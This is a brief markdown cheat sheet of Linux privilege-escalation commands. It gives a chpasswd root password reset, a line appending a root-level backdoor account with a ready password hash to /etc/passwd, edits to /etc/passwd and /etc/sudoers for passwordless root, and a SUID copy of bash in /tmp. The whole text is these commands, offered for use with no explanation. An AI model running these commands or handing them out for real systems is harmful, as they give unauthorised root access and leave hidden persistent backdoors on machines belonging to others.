# Escalation Methods

```
echo root:gl0b0 | /usr/sbin/chpasswd

// exploit : exploit (pwd)
echo "exploit:YZE7YPhZJyUks:0:0:root:/root:/bin/bash" >> /etc/passwd | su - exploit

nano /etc/passwd -> change GID to root

nano /etc/sudoers -> user ALL=(ALL) NOPASSWD:ALL

cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash;
/tmp/rootbash -p
```
